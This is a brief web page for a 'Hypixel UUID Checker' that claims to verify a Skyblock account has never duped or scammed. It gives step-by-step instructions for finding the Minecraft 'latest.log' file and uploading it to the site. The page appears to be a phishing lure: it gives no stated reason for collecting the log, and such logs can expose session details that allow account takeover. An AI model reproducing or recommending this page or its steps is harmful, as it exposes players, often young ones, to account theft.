Hypixel UUID Checker

This web-app allows you to do a "background check" on your Hypixel Skyblock UUID to make sure you've never duped or scammed.


Upload Latest.log file:


Where to find latest.log file:

1. Run the 1.8.9 Vanilla Version of Minecraft.

2. Open Hypixel.net then open skyblock.

3. Close minecraft after loading into skyblock.

4. Return to our website and click "Choose Files" under the "Upload latest.log file:" header.

5. Navigate to the "logs" folder in your ".minecraft" folder.

6. Submit the file named "latest.log"

7. Click check UUID!
